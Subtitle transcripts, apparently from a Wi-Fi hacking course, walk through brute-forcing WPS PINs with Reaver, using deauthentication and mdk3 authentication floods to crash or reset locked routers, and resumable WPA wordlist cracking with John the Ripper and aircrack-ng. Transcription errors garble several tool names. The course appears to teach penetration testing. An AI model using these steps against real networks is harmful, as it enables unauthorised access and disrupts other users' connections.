00:01:14,870 --> 00:01:21,380
So if you were cracking a network and you reached 50%, for example, and then you wanted to stop that

19
00:01:21,380 --> 00:01:27,080
attack, for some reason, you can just press control C at the same time, go do whatever you want it

20
00:01:27,080 --> 00:01:33,500
to do and come back even weeks after and just launch River again against that network and River will

21
00:01:33,500 --> 00:01:36,590
know where it stopped and it will start from 50%.

22
00:01:36,590 --> 00:01:38,390
So it's not going to start from scratch.

23
00:01:38,390 --> 00:01:43,040
So with this, I'm going to tell it, yes, please resume and it's going to start with me so you can

24
00:01:43,040 --> 00:01:49,430
see that so far I tried 25 pins and it's just going to keep going and it's going to try to brute force

25
00:01:49,430 --> 00:01:50,600
all possibilities.

26
00:01:50,630 --> 00:01:56,720
And if we look at the start, you'll remember that it said there's 11,000 possibilities.

27
00:01:56,930 --> 00:01:59,390
So it can actually cover all these possibilities.

28
00:01:59,390 --> 00:02:00,440
It's not a huge number.

29
00:02:00,440 --> 00:02:06,200
And then when it covers all of them, it will definitely be able to get the pin and then calculate the

30
00:02:06,200 --> 00:02:07,370
key from the pin.

31
00:02:07,760 --> 00:02:11,460
Now I'm going to control C out of this because this is actually working properly.

32
00:02:11,460 --> 00:02:16,500
And I just want to I just want to show you what it would look like while it's working.

33
00:02:16,500 --> 00:02:18,810
If the pin was a bit more complicated.

34
00:02:19,020 --> 00:02:23,040
So you can see right here, it reached 0.37%.

35
00:02:23,040 --> 00:02:30,450
And it's saying that the estimated maximum time is six hours, five minutes to cover all possibilities.

36
00:02:30,450 --> 00:02:35,520
So you might actually be able to get the to guess the pin before that time and get the key.

37
00:02:35,520 --> 00:02:40,110
But the maximum time that you're going to have to wait is six hours, five minutes and 18 seconds.

38
00:02:40,140 --> 00:02:43,830
Now, if I go up now, notice that it's 0.37%.

39
00:02:43,860 --> 00:02:49,020
If I go up, you'll see that I was at 0.33%.

40
00:02:49,020 --> 00:02:50,610
So it's actually working.

41
00:02:50,610 --> 00:02:55,350
It's trying the pins, it's going through the pins and trying them one by one individually.

42
00:02:55,350 --> 00:02:56,490
So everything is working.

43
00:02:56,490 --> 00:03:00,840
All I have to do in this case is just wait for it to guess the pin and then give me the key.

44
00:03:02,010 --> 00:03:08,610
Now this router is configured in a way that it's going to accept failed attempts and it will never lock.

45
00:03:08,640 --> 00:03:13,170
So when we run wash, I'm just going to go and run wash again like I did.

46
00:03:16,500 --> 00:03:21,660
You'll see the WP locked here and for my test app.

47
00:03:23,470 --> 00:03:29,830
It still said to know what this basically means is some routers lock after a number of failed attempts.

48
00:03:29,830 --> 00:03:36,070
So when you try to authenticate with them using a wrong pin after four, five, six, however the router

49
00:03:36,070 --> 00:03:41,770
is configured, they will lock and they'll stop accepting any requests even if we try the right pin.

50
00:03:41,890 --> 00:03:46,180
So the router that I'm trying against right now, the test app never locks.

51
00:03:46,180 --> 00:03:49,180
Even if I try a thousand wrong pins, it'll never lock.

52
00:03:49,270 --> 00:03:54,250
So that's really handy and that's why it's very easy to crack while you're testing.

53
00:03:54,250 --> 00:03:59,350
You might face some routers that are configured to lock after a number of failed attempts.

54
00:03:59,350 --> 00:04:04,240
And once the router locks, basically you won't be able to do anything and you'll have to wait for it

55
00:04:04,240 --> 00:04:05,560
until it unlocks.

56
00:04:05,560 --> 00:04:12,310
Some routers unlock after a minute, some routers lock after five minutes and some routers take days

57
00:04:12,310 --> 00:04:13,120
to unlock.

58
00:04:13,240 --> 00:04:18,040
So it's not really a good idea to just sit down and wait for the router to unlock.

59
00:04:18,950 --> 00:04:25,940
Now my other router, the updated one that sent from the company, actually does lock after failed attempts.

60
00:04:25,940 --> 00:04:30,770
And I'm going to show you now I'm just going to run River against it and I'm going to show you how the

61
00:04:30,770 --> 00:04:32,550
router looks like if it's locked.

62
00:04:32,570 --> 00:04:38,750
So my other router is actually the one that I'm using currently, so it's still named the default name

63
00:04:39,500 --> 00:04:45,140
and it's this one, so I'm going to run River against it again using the same command that we did in

64
00:04:45,140 --> 00:04:46,310
the previous lecture.

65
00:04:46,610 --> 00:04:52,130
I'm not going to do anything fancy, so it's just going to be I'm going to clear this first and then

66
00:04:52,130 --> 00:04:53,270
I'm going to do River.

67
00:04:54,040 --> 00:04:54,880
Minus B.

68
00:04:56,880 --> 00:05:02,570
And running on Channel six, and then I'm going to give it my wireless card in monitor mode.

69
00:05:02,580 --> 00:05:03,540
Hit enter.

70
00:05:04,380 --> 00:05:06,720
Sorry, I had to give it after minus I.

71
00:05:09,230 --> 00:05:12,800
And again, just asking me if I wanted to continue from the last time.

72
00:05:12,800 --> 00:05:15,290
I'm going to say no to start from scratch.

73
00:05:17,160 --> 00:05:21,390
And you can see that it works for a bit and then it just completely locks.

74
00:05:21,390 --> 00:05:22,800
It doesn't really do anything.

75
00:05:22,800 --> 00:05:24,570
It just sits down there.

76
00:05:25,080 --> 00:05:27,000
Now, if I press Ctrl C.

77
00:05:28,510 --> 00:05:30,130
And run wash again.

78
00:05:33,800 --> 00:05:39,620
You'll see that the writer got locked right here and it won't accept any more requests right now.

79
00:05:39,620 --> 00:05:44,000
So we can't really do anything at the moment because WP is locked.

80
00:05:45,310 --> 00:05:53,050
Now, the simplest way to get the router to unlock is to just the authenticate all the connected computers

81
00:05:53,050 --> 00:05:59,290
and keep doing that for a long period of time until the user, one of the users, will just think that

82
00:05:59,290 --> 00:06:03,850
there is something happening in the network and just goes in and turn off the router and turn it back

83
00:06:03,850 --> 00:06:04,330
on.

84
00:06:04,540 --> 00:06:10,030
When they do that, the router will get unlocked and then you'll be able to run river again.

85
00:06:10,300 --> 00:06:14,770
So to do that, all you have to do is do an authentication attack like we did before.

86
00:06:14,770 --> 00:06:15,850
So you're going to do a replay.

87
00:06:18,070 --> 00:06:19,030
The earth.

88
00:06:20,460 --> 00:06:22,410
You going to give it the access point?

89
00:06:24,970 --> 00:06:30,040
And you're not going to specify a client because you want it to connect all the clients and then you're

90
00:06:30,040 --> 00:06:33,310
going to give it the card in monitor mode, which is one zero.

91
00:06:33,880 --> 00:06:38,190
And don't forget to specify a really large number after the dot.

92
00:06:39,260 --> 00:06:43,670
Now, we spoke about this before, and I'm not going to run this attack right now because it actually

93
00:06:43,670 --> 00:06:48,770
requires physical interaction of the user to go and restart the router.

94
00:06:49,480 --> 00:06:53,770
So again, it's not the best way, but it is a way to get the router to restart.

95
00:06:54,160 --> 00:06:56,350
There is better methods to do that.

96
00:06:56,380 --> 00:07:01,960
We're going to do them using a tool called three and we'll talk about them in the next lecture.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,260 --> 00:00:06,470
So in the previous lecture we seen if we run a river against this particular network, the network will

2
00:00:06,470 --> 00:00:14,660
get locked and we won't be able to brute force the spin because the network will just refuse any requests.

3
00:00:14,930 --> 00:00:23,270
So we said one of the ways to try and reset or get the network to get unlocked is to just run a D authentication

4
00:00:23,270 --> 00:00:29,570
attack like we did before and hope that one of the users will just go in and physically turn off the

5
00:00:29,570 --> 00:00:31,610
router and then turn it back on.

6
00:00:31,760 --> 00:00:36,350
And we said, this is not a great way because we actually were relying on a person to go and turn off

7
00:00:36,350 --> 00:00:37,070
the router.

8
00:00:37,070 --> 00:00:42,830
But it has a high chance of success because what would you do when you lose internet connection?

9
00:00:42,830 --> 00:00:47,240
Most people would just go and turn off their router and turn it back on.

10
00:00:48,380 --> 00:00:54,650
So in this lecture, we're going to use a tool called three and we're going to use it to run a DDoS

11
00:00:54,680 --> 00:01:01,380
attack, a denial of service attack basically on the target network and in some routers.

12
00:01:01,380 --> 00:01:06,810
This attack will just float the router and then it will cause the router to reset automatically.

13
00:01:06,810 --> 00:01:10,160
And then when it resets, it will get unlocked as well.

14
00:01:10,170 --> 00:01:15,180
So we'll be able to run river and start guessing the pin again.

15
00:01:15,180 --> 00:01:19,950
And since River supports pause and resume, this can work really well.

16
00:01:19,950 --> 00:01:26,130
So even if you are at 60% and then the router locks, you can just control see river run this attack,

17
00:01:26,130 --> 00:01:31,290
get the router to be unlocked and then run the attack again and it'll start from 60%.

18
00:01:31,290 --> 00:01:32,850
It's not going to start from zero.

19
00:01:33,540 --> 00:01:36,210
So I'm just going to split the screen here.

20
00:01:39,870 --> 00:01:44,400
And I'm just going to run the tool that we're going to be using is called Mdk three.

21
00:01:46,180 --> 00:01:50,140
And I'm going to type in help just to see the options that this tool gives us.

22
00:01:52,230 --> 00:01:58,230
And you can see that this tool actually let us run a number of attacks and the test modes are listed

23
00:01:58,230 --> 00:01:58,870
in here.

24
00:01:58,890 --> 00:02:02,560
So the way the tool works is you specify the name of the tool.

25
00:02:02,580 --> 00:02:09,300
You follow it up with your interface and monitor mode, and then you follow it with the test mode which

26
00:02:09,300 --> 00:02:10,650
are listed in here.

27
00:02:10,650 --> 00:02:14,490
And then you give it the options for each of these test modes.

28
00:02:15,240 --> 00:02:21,930
For this lecture, we're going to be using the A option, which is the authentication DDoS mode.

29
00:02:22,860 --> 00:02:29,310
So to see all the options and get more information about this attack, we're going to do Mdk three minus

30
00:02:29,310 --> 00:02:35,730
minus help and then put the test mode, which is a so I'm just going to do Mdk three.

31
00:02:36,820 --> 00:02:37,360
Minus.

32
00:02:37,360 --> 00:02:37,690
Minus.

33
00:02:37,690 --> 00:02:38,290
Help.

34
00:02:39,380 --> 00:02:40,790
And I'm going to put a.

35
00:02:42,300 --> 00:02:45,930
And this will give us more information about the attack that we want to do.

36
00:02:45,930 --> 00:02:49,260
So it's going to be an authentication DDoS mode.

37
00:02:49,290 --> 00:02:52,890
It's going to send authentication frames to the AP.

38
00:02:53,040 --> 00:03:00,210
So basically what it's going to do is we're going to specify a mac address for our target, and three

39
00:03:00,210 --> 00:03:06,540
will create fake Mac addresses and get all of these Mac addresses to pretend as if they're computers

40
00:03:06,540 --> 00:03:07,350
or clients.

41
00:03:07,350 --> 00:03:10,830
And these clients are trying to connect to that network.

42
00:03:11,600 --> 00:03:17,750
When there is a very large number of clients trying to connect to one network to one router, some routers

43
00:03:17,750 --> 00:03:23,810
will not be able to handle all this demand and they'll actually just restart and reset everything.

44
00:03:23,810 --> 00:03:29,900
And when they do that, they'll unlock the and we'll be able to run river again.

45
00:03:30,410 --> 00:03:36,350
So if you run it, if you run mvc3 with the A option, it will do that on all the networks around you.

46
00:03:36,350 --> 00:03:40,730
So it's going to create a very large number of clients and it's going to get all of these clients to

47
00:03:40,730 --> 00:03:42,890
connect to all the networks around you.

48
00:03:42,890 --> 00:03:43,910
And we don't want that.

49
00:03:43,910 --> 00:03:45,740
We only want to target one network.

50
00:03:45,740 --> 00:03:51,230
So we're going to specify the target network with the minus a option to specify the target.

51
00:03:51,230 --> 00:03:59,420
Mac And we're also going to use minus M to tell it that we want you to use valid Macs so max of actual

52
00:03:59,420 --> 00:04:05,060
devices, instead of using a mac that looks like it's fake, like 000000.

53
00:04:06,070 --> 00:04:07,870
So let's run the command.

54
00:04:07,870 --> 00:04:10,960
Let me show you the command that we're going to use and things are going to get more clear.

55
00:04:10,960 --> 00:04:14,500
So the program that we're going to use is called Mdk three.

56
00:04:16,840 --> 00:04:20,230
Then we're going to give it the interface in monitor mode.

57
00:04:20,230 --> 00:04:22,000
And it's one zero in my case.

58
00:04:23,330 --> 00:04:29,230
Then we're going to give it the test mode or the attack mode, and that's the authentication DDoS mode.

59
00:04:29,240 --> 00:04:30,710
So that's going to be a.

60
00:04:32,030 --> 00:04:37,340
And then we want to run that against only one specific router, not all routers.

61
00:04:37,340 --> 00:04:39,860
So we're going to specify the minus a.

62
00:04:41,840 --> 00:04:44,690
And give it the Mac address of my target router.

63
00:04:46,300 --> 00:04:49,210
Which is the same Mac address in here.

64
00:04:49,240 --> 00:04:51,940
It's the same Mac address that's locked in here.

65
00:04:52,300 --> 00:04:53,290
Right here.

66
00:04:54,930 --> 00:05:01,200
And then we're going to give it minus M to tell it to use valid Mac addresses instead of just ones that

67
00:05:01,200 --> 00:05:01,990
look wrong.

68
00:05:02,010 --> 00:05:05,640
So we're going to do minus M and that's it.

69
00:05:05,670 --> 00:05:06,540
We're ready to go.

70
00:05:06,540 --> 00:05:09,120
So we're just going to go over the command one more time.

71
00:05:09,120 --> 00:05:11,610
We're using a tool called Mdk three.

72
00:05:11,640 --> 00:05:14,070
We're giving it the interface in monitor mode.

73
00:05:14,070 --> 00:05:15,930
In my case, it's mod zero.

74
00:05:15,960 --> 00:05:16,830
We're telling it.

75
00:05:16,860 --> 00:05:22,950
We want to use the attack that's referred to with the A option, which is the authentication dos mode.

76
00:05:22,980 --> 00:05:30,030
We're giving it my target access point after the minus a and then I'm giving it minus M to use valid

77
00:05:30,030 --> 00:05:30,960
Mac addresses.

78
00:05:32,140 --> 00:05:33,370
I'm going to hit Enter.

79
00:05:34,580 --> 00:05:36,980
And I actually misspelled Mk3.

80
00:05:36,980 --> 00:05:39,440
I said MK D3I do that a lot.

81
00:05:39,440 --> 00:05:42,620
So it's MK three hit enter.

82
00:05:44,970 --> 00:05:51,060
And you might see a result like this saying that the target computer, the target router, does not

83
00:05:51,060 --> 00:05:52,200
seem to be vulnerable.

84
00:05:52,230 --> 00:05:53,890
But just let it work.

85
00:05:53,910 --> 00:05:57,840
Sometimes you might have to let it work up to 50,000 clients.

86
00:05:58,110 --> 00:06:03,360
You can see that it's creating fake clients and it's trying to get them to connect to the router so

87
00:06:03,360 --> 00:06:06,380
you can to associate with the router, really not connect.

88
00:06:06,390 --> 00:06:10,200
And you can see that we reached 5000 clients right here.

89
00:06:11,400 --> 00:06:14,190
This could be different from one router to another.

90
00:06:14,190 --> 00:06:17,670
So sometimes I had to let this go up to 50,000.

91
00:06:17,700 --> 00:06:23,670
In this case, with my home router right here, it usually resets between 5000 and 10,000.

92
00:06:23,970 --> 00:06:27,300
So I'm just going to let it go up to 10,000 in this case.

93
00:06:28,390 --> 00:06:34,120
And once it's at 10,000 like this, I'm going to control C at the same time to get out of this.

94
00:06:35,270 --> 00:06:39,050
And we're going to run watch again to see if the network is still locked.

95
00:06:39,050 --> 00:06:42,440
So you can see the last time we run wash, the network was locked.

96
00:06:42,560 --> 00:06:47,390
So I'm just going to give it some time to reset and then I'm just going to be running watch.

97
00:06:47,390 --> 00:06:52,250
The same command that we always use is just watch minus I on zero.

98
00:06:53,450 --> 00:06:58,670
And keep in mind, this doesn't work against all routers, but it works against a lot of routers really,

99
00:06:58,670 --> 00:06:59,720
but not all.

100
00:06:59,720 --> 00:07:02,600
So it might not just work for you.

101
00:07:02,840 --> 00:07:05,930
So I'm going to hit Enter now to look for networks around me.

102
00:07:08,810 --> 00:07:13,310
Looks like something went wrong with my wireless card, so I'm just going to disconnect it.

103
00:07:13,310 --> 00:07:16,520
Reconnected, enable monitor mode and run wash again.

104
00:07:18,010 --> 00:07:20,350
Okay, so I'm just going to run wash again here.

105
00:07:23,030 --> 00:07:30,830
And as you can see now, our target network got reset and you can see that WP is not locked anymore.

106
00:07:31,160 --> 00:07:37,190
So I can actually start river again and it will be able to pick up from where it left the last time.

107
00:07:37,770 --> 00:07:40,980
So last time the pin count was left at zero.

108
00:07:40,980 --> 00:07:45,630
And right now, if I run it again, I'll be able to go to pin count one.

109
00:07:45,630 --> 00:07:48,000
So I'll actually be able to test one more pin.

110
00:07:48,000 --> 00:07:52,350
So if we just do river again using the same command that we did before.

111
00:07:54,630 --> 00:07:59,040
You can see that it's asking me if I want to continue from where I left the last time.

112
00:07:59,040 --> 00:08:00,390
I'm going to say yes, please.

113
00:08:03,800 --> 00:08:06,250
Now, again, the writer got locked again right now.

114
00:08:06,260 --> 00:08:13,160
But you can see that we managed to go ahead with one more pin to test one pin right now.

115
00:08:13,160 --> 00:08:19,880
And if we do the same now, get the writer to unlock and do the same, you'll be able to go to the next

116
00:08:19,880 --> 00:08:20,330
pin.

117
00:08:20,360 --> 00:08:23,120
Now, this network is actually a quite stubborn one.

118
00:08:23,120 --> 00:08:27,720
Usually networks lock after four or sometimes even ten attempts.

119
00:08:27,740 --> 00:08:30,590
Very rarely they lock after one attempt only.

120
00:08:30,590 --> 00:08:33,670
But again, this just serves with our examples.

121
00:08:33,680 --> 00:08:39,380
The main thing is you can unlock most networks using this method using Mdk three.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 6: Gaining Access - WPA & WPA2 Cracking - Advanced Wordlist Attack

1
00:00:00,080 --> 00:00:06,710
Now if WP is disabled or if you tried it and you tried everything that I showed you so far and it still

2
00:00:06,710 --> 00:00:13,460
didn't work, then you only have two more options to gain access to a WPA or a WPA network.

3
00:00:13,490 --> 00:00:18,740
You can either use a word list attack or use an evil to an attack.

4
00:00:19,100 --> 00:00:22,790
So in this section, we're going to focus on word list attacks.

5
00:00:23,720 --> 00:00:29,330
Now, as you know, where this attacks will work against all WPA and WPA networks.

6
00:00:29,330 --> 00:00:35,780
And it will actually give you the key as long as the password or the key is included in the word list

7
00:00:35,780 --> 00:00:36,760
that you're using.

8
00:00:36,770 --> 00:00:43,760
So the whole thing depends on how strong your word list is and how quick your computer is, because

9
00:00:43,760 --> 00:00:49,160
you can theoretically, you can use a huge word list that will cover all possibilities, but that will

10
00:00:49,160 --> 00:00:50,350
take years.

11
00:00:50,360 --> 00:00:57,350
So in this section, I'm going to show you how to use huge word lists with Aircrack ng without taking

12
00:00:57,350 --> 00:00:59,960
a lot of space from your hard drive.

13
00:01:00,870 --> 00:01:06,000
I'm also going to show you how to pause and resume the cracking process, because if you're using a

14
00:01:06,000 --> 00:01:09,780
huge word list, then the cracking process is going to take a long time.

15
00:01:09,780 --> 00:01:11,820
So it might take days or weeks.

16
00:01:11,820 --> 00:01:16,890
So I'm going to show you how to stop and then start from where you left the next time so you can turn

17
00:01:16,890 --> 00:01:21,060
off your computer or come back to the cracking process whenever you can.

18
00:01:21,690 --> 00:01:28,500
Finally, I'm going to show you how to practically run a word list attack using the GPU instead of the

19
00:01:28,500 --> 00:01:29,400
CPU.

20
00:01:29,550 --> 00:01:35,910
The GPU will be much faster than the CPU and you'll see it'll save you so much time in cracking if you

21
00:01:35,910 --> 00:01:38,130
have a strong or a good GPU.

ftp://ftp.openwall.com/pub/wordlists/
http://www.openwall.com/mirrors/
https://github.com/danielmiessler/SecLists
http://www.outpost9.com/files/WordLists.html
http://www.vulnerabilityassessment.co.uk/passwords.htm
http://packetstormsecurity.org/Crackers/wordlists/
http://www.ai.uga.edu/ftplib/natural-language/moby/
http://www.cotse.com/tools/wordlists1.htm
http://www.cotse.com/tools/wordlists2.htm
http://wordlist.sourceforge.net/


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,940 --> 00:00:01,420
Now.

2
00:00:01,420 --> 00:00:09,040
So far we learned how to use aircrack ng to run a wordlist attack and crack the password for WPA and

3
00:00:09,310 --> 00:00:10,750
wpa2 networks.

4
00:00:11,320 --> 00:00:13,510
We did this by doing aircrack ng.

5
00:00:15,690 --> 00:00:18,720
Followed by the file name that contains the handshake.

6
00:00:22,000 --> 00:00:26,600
And followed by the name of the word list, which in my case is WP.

7
00:00:26,710 --> 00:00:28,360
A word list.

8
00:00:29,210 --> 00:00:30,770
Now run in this command.

9
00:00:30,800 --> 00:00:32,600
We'll start the cracking.

10
00:00:32,600 --> 00:00:38,120
And as you can see now, it's going through the whole word list, trying every single possible password

11
00:00:38,120 --> 00:00:38,840
in there.

12
00:00:39,080 --> 00:00:41,660
So I'm going to control C this.

13
00:00:42,870 --> 00:00:46,830
And as you can see, I have a quite big dictionary in here.

14
00:00:46,830 --> 00:00:53,130
So it would take two hours and 13 minutes to go through this whole dictionary to try all the possible

15
00:00:53,130 --> 00:00:54,360
passwords in there.

16
00:00:55,330 --> 00:00:59,320
Now there are much bigger dictionaries than the one I'm using right here.

17
00:00:59,320 --> 00:01:03,970
So the cracking process can take several hours or even days.

18
00:01:04,720 --> 00:01:07,450
Now, this is not bad for cracking WPA.

19
00:01:07,510 --> 00:01:10,390
I wouldn't mind waiting a day or two to get my password.

20
00:01:10,420 --> 00:01:16,000
The only problem is you're going to have to let aircrack ng run for this amount of time.

21
00:01:16,000 --> 00:01:20,350
Because if you quit aircrack ng and run the command again.

22
00:01:20,650 --> 00:01:27,550
As you can see, we're going to start from 0% again and we're going to start from the start of the file.

23
00:01:27,550 --> 00:01:33,910
So aircrack ng doesn't save where it reached in the previous cracking session.

24
00:01:34,690 --> 00:01:41,680
So what I want to show you today is how to save the cracking session so that if you quit aircrack ng

25
00:01:41,680 --> 00:01:47,200
and come back to it in a day or two, or even if you come back to it after a week, you'll still have

26
00:01:47,200 --> 00:01:51,100
your session and you'll start from where you left the last time.

27
00:01:52,420 --> 00:01:57,580
So to do this, we're going to first of all, use a tool called John the Ripper.

28
00:01:57,610 --> 00:02:03,250
Now, John the Ripper is a very famous cracking tool that can be used to do many things.

29
00:02:03,550 --> 00:02:08,770
In this lecture, we're going to use it to do something very simple, which is literally just display

30
00:02:08,770 --> 00:02:13,300
our word list on the screen and I'll tell you why we'll do that.

31
00:02:13,980 --> 00:02:15,900
So first of all, let me show you the command.

32
00:02:15,900 --> 00:02:17,010
It's going to be John.

33
00:02:18,130 --> 00:02:20,710
Followed by the name of the word list.

34
00:02:20,710 --> 00:02:22,120
So we're going to say word list.

35
00:02:23,300 --> 00:02:26,080
And give it the name of my word list, which is WPA.

36
00:02:26,150 --> 00:02:26,930
Word list.

37
00:02:29,850 --> 00:02:34,980
And then I'm going to tell it that I want you to display this on the standard output.

38
00:02:36,290 --> 00:02:39,320
Which is basically this current terminal screen.

39
00:02:39,680 --> 00:02:41,840
So the command is very simple.

40
00:02:41,840 --> 00:02:44,270
We're just doing John, which is the name of the program.

41
00:02:44,270 --> 00:02:48,050
We're giving it our word list, which is stored in the root directory.

42
00:02:48,050 --> 00:02:49,670
So it's the current working directory.

43
00:02:49,670 --> 00:02:52,370
That's why all I have to do is just give its name.

44
00:02:52,370 --> 00:02:58,250
And then I'm saying that I want you to display this to me on the standard output on the terminal screen.

45
00:02:58,790 --> 00:03:00,200
Now I'm going to hit enter.

46
00:03:00,740 --> 00:03:07,520
And as you can see, this command literally just lists all the passwords stored in the word list.

47
00:03:07,550 --> 00:03:12,530
Now, I'll hit Ctrl C to stop because it's a very big file and it'll take a while to list everything,

48
00:03:12,530 --> 00:03:13,700
but you get the idea.

49
00:03:13,700 --> 00:03:16,940
The command will literally just display all the passwords on screen.

50
00:03:18,480 --> 00:03:21,280
Now the question is, why am I doing this?

51
00:03:21,300 --> 00:03:27,600
Well, in Linux we can redirect the output to anywhere we want.

52
00:03:27,630 --> 00:03:28,290
Really.

53
00:03:28,800 --> 00:03:34,680
So we're going to use a very useful feature where we can redirect the output of this current command

54
00:03:34,680 --> 00:03:38,190
and use it as an input to another command.

55
00:03:39,160 --> 00:03:45,370
Now, we seen before that when we use aircrack ng, we give it our word list as the input.

56
00:03:46,240 --> 00:03:52,300
Today we're going to use the output generated by the command that we've just seen, which is basically

57
00:03:52,300 --> 00:03:59,950
our word list, and we're going to use it as an input to aircrack NG and we're going to use that using

58
00:03:59,950 --> 00:04:06,160
the pipe character, which is the vertical bar, and then we're going to use our aircrack ng command

59
00:04:06,160 --> 00:04:06,580
in here.

60
00:04:06,580 --> 00:04:08,140
So it's going to be aircrack ng.

61
00:04:10,150 --> 00:04:17,020
Followed by the minus W option where we usually give our word list, but we're not going to give a word

62
00:04:17,020 --> 00:04:17,700
list this time.

63
00:04:17,710 --> 00:04:23,920
We wanted to use the output generated by the previous command, and to do that we're just going to put

64
00:04:23,920 --> 00:04:29,620
a dash instead of the word list and then we're going to fill the command as we usually do.

65
00:04:29,620 --> 00:04:35,580
So we're going to do minus B to specify the Mac address for my target network.

66
00:04:35,590 --> 00:04:41,620
Now, I've already copied this, so I'm just going to paste it and then we're going to specify the name

67
00:04:41,620 --> 00:04:43,690
of the file that contains the handshake.

68
00:04:43,690 --> 00:04:48,700
And in my case it's called handshake minus 01. cap.

69
00:04:51,000 --> 00:04:54,700
So I'm going to go over this command again just to explain it to you.

70
00:04:54,720 --> 00:04:58,740
So first of all, we're using the first command here that I showed you before.

71
00:04:58,740 --> 00:05:06,630
And this command is literally just going to display the output of the word list on screen.

72
00:05:07,200 --> 00:05:14,550
Then we use the bar character to pipe the output of the screen, which is basically my word list to

73
00:05:14,550 --> 00:05:15,480
aircrack ng.

74
00:05:16,080 --> 00:05:19,260
So we use aircrack ng as we usually do.

75
00:05:19,260 --> 00:05:25,230
And the only difference in here, instead of giving a word list name, we put a dash to tell aircrack

76
00:05:25,230 --> 00:05:31,020
that get your word list from the result of the previous command from the result of the pipe.

77
00:05:32,770 --> 00:05:34,570
Now, all of this is good.

78
00:05:34,570 --> 00:05:41,170
But what we did so far, basically, we're literally just doing something that is very similar to the

79
00:05:41,170 --> 00:05:46,300
normal aircrack ng command, because this command right here displays the word list and this command

80
00:05:46,300 --> 00:05:47,490
right here reads it.

81
00:05:47,500 --> 00:05:53,110
So we still haven't stored our session and here is why we use John the Ripper.

82
00:05:53,110 --> 00:05:57,580
So the only reason we use John the Ripper is not to display the output on screen.

83
00:05:57,580 --> 00:05:59,170
This is this is useless.

84
00:05:59,200 --> 00:06:04,960
We can do it using other programs, but we use it because it can store and resume sessions.

85
00:06:04,960 --> 00:06:10,810
So we're going to add one more argument to John the Ripper, and that is the most important argument,

86
00:06:10,810 --> 00:06:12,400
which is called the session.

87
00:06:12,400 --> 00:06:14,110
So we're going to do session.

88
00:06:16,470 --> 00:06:18,030
And we're going to name it anything.

89
00:06:18,030 --> 00:06:23,340
So we're just going to name it UPC because the name of my network is UPC.

90
00:06:24,540 --> 00:06:30,330
So now when John the Ripper will run, it's going to read all the passwords.

91
00:06:30,360 --> 00:06:33,300
It's going to pipe them to aircrack ng.

92
00:06:33,540 --> 00:06:37,140
Aircrack NG is going to read these passwords and start cracking.

93
00:06:37,140 --> 00:06:43,170
And then when we quit, John the Ripper will start the session in a file called UPC.

94
00:06:44,010 --> 00:06:45,450
So I'm going to hit Enter.

95
00:06:46,740 --> 00:06:51,510
And you'll see that aircrack ng will just start, as usual, trying to crack my password.

96
00:06:52,080 --> 00:06:57,540
And I'm just going to let this run for a little bit of time so some progress is made and then we'll

97
00:06:57,540 --> 00:07:00,900
see if we're actually resuming from where we left.

98
00:07:02,950 --> 00:07:06,550
Okay, now I'm going to press on the Q button to quit.

99
00:07:09,290 --> 00:07:13,450
And as you can see, we finished 0.4.

100
00:07:13,460 --> 00:07:17,030
You can think 0.39 of the whole file.

101
00:07:17,030 --> 00:07:20,540
So our progress is 0.39%.

102
00:07:22,520 --> 00:07:28,820
So our session name now is called UPC because we specified that in the session argument.

103
00:07:29,240 --> 00:07:31,820
So I'm going to clear all of this.

104
00:07:35,430 --> 00:07:38,850
And we're going to use John again to resume the session.

105
00:07:40,290 --> 00:07:42,270
So we're going to tell it to restore.

106
00:07:45,090 --> 00:07:47,250
And then we're going to give it the session name.

107
00:07:47,250 --> 00:07:48,930
And my session name is UPC.

108
00:07:50,220 --> 00:07:54,840
Then I'm going to pipe all of this again to aircrack ng.

109
00:07:57,220 --> 00:08:04,000
I'm going to give it minus W my word list and I'm going to set that to dash because again, I want it

110
00:08:04,000 --> 00:08:10,030
to get the word list from the result of the previous command, which is the John the Ripper command.

111
00:08:11,050 --> 00:08:13,690
Then I'm going to give it my bssid.

112
00:08:18,020 --> 00:08:24,500
Followed by the name of the file that contains the handshake, which is handshake.

113
00:08:24,890 --> 00:08:26,870
01. cap.

114
00:08:29,130 --> 00:08:35,670
Now notice, this time we didn't specify a word list because basically what we're doing is we're telling

115
00:08:35,670 --> 00:08:39,660
John the Ripper to start from where it left last time.

116
00:08:39,660 --> 00:08:45,300
We gave the word list in the previous command, and now all we have to do is literally just tell John

117
00:08:45,300 --> 00:08:46,860
to start from where you left.

118
00:08:46,860 --> 00:08:50,570
And John can do that because it supports that functionality.

119
00:08:50,580 --> 00:08:57,660
And then we're piping whatever John is going to read to aircrack NG again with Aircrack NG, we're not

120
00:08:57,660 --> 00:09:00,690
giving it the word list because it's getting it from John.

121
00:09:00,780 --> 00:09:04,320
Then we're giving it the bssid and the handshake file.

122
00:09:05,110 --> 00:09:06,460
Now if I hit enter.

123
00:09:08,090 --> 00:09:10,220
You'll see the cracking will start again.

124
00:09:10,220 --> 00:09:16,580
But I'm going to stop it quickly this time just to show you that we are already at 50%.

125
00:09:16,610 --> 00:09:21,860
So as you can see, there is no way we could have done that in this very short period of time, which

126
00:09:21,860 --> 00:09:25,910
means we basically started from where we left the last time.

127
00:09:26,730 --> 00:09:32,310
So like I said, this method is very, very simple because it allows you to basically stop the attack

128
00:09:32,310 --> 00:09:34,260
and then come back whenever you want.

129
00:09:34,920 --> 00:09:41,400
Also, piping is a very handy skill to know because you can actually use it in so many scenarios to

130
00:09:41,400 --> 00:09:43,140
do different types of things.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,650 --> 00:00:06,740
In the previous lecture, we covered how to store our progress when going through a large word list.

2
00:00:06,980 --> 00:00:14,120
This allows us to pause and resume so that we can stop our cracking session and then come back at a

3
00:00:14,120 --> 00:00:19,760
different time and then start the session from where we left, which is very handy when we have a large

4
00:00:19,760 --> 00:00:20,570
word list.

5
00:00:21,440 --> 00:00:27,200
Another issue that we might face when you use an A large word list is the disk space.

6
00:00:27,200 --> 00:00:32,210
So a large word list would basically just take a lot of space from our disk.

7
00:00:33,420 --> 00:00:41,700
The solution to this is to generate the word list using crunch and pass it on the fly to aircrack ng.

8
00:00:42,360 --> 00:00:46,980
So basically we're going to be using Crunch to create the word list like we seen before.

9
00:00:46,980 --> 00:00:53,730
But instead of saving the word list on disk, we're going to make it produce the word list on screen.

10
00:00:54,390 --> 00:01:00,960
